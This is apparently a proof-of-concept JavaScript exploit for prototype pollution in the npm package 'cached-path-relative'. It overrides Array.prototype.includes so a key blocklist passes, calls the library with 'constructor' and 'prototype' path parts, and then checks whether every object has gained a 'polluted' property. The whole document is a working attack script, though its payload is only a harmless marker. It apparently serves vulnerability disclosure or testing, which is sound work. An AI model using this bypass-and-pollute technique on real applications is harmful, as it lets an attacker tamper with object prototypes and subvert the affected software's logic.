Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
var relative = require('cached-path-relative');
relative('constructor', 'prototype', 'polluted');
if ({}.polluted != undefined) {
    console.log('yes');
} else {
    console.log(undefined);
}